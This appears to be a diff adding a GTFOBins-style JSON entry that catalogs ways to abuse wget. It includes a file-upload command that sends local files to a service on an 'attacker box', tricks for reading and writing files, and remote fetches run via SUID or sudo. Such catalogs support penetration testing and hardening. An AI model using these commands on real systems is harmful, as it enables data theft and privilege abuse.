@@ -1,0 +1,40 @@
+{
+  "functions": {
+    "file-upload": [
+      {
+        "description": "Send local file with an HTTP POST request. Run an HTTP service on the attacker box to collect the file. Note that the file will be sent as-is, instruct the service to not URL-decode the body. Use '--post-data' to send hard-coded data.",
+        "code": "wget --post-file=[file] [url]\n"
+      }
+    ],
+    "file-read": [
+      {
+        "description": "The file to be read is treated as a list of URLs, one per line, which are actually fetched by 'wget'. The content appears, somewhat modified, as error messages, thus this is not suitable to read arbitrary binary data.",
+        "code": "wget -i [file]\n"
+      }
+    ],
+    "file-write": [
+      {
+        "description": "The data to be written is treated as a list of URLs, one per line, which are actually fetched by 'wget'. The data is written, somewhat modified, as error messages, thus this is not suitable to write arbitrary binary data.",
+        "code": "TF=$(mktemp)\necho [data] > $TF\nwget -i $TF -o [file]\n"
+      }
+    ],
+    "file-download": [
+      {
+        "description": "Fetch a remote file via HTTP GET request.",
+        "code": "wget [url] -O [file]\n"
+      }
+    ],
+    "suid": [
+      {
+        "description": "Fetch a remote file via HTTP GET request.",
+        "code": "./wget [url] -O [file]\n"
+      }
+    ],
+    "sudo": [
+      {
+        "description": "Fetch a remote file via HTTP GET request.",
+        "code": "sudo wget [url] -O [file]\n"
+      }
+    ]
+  }
+}
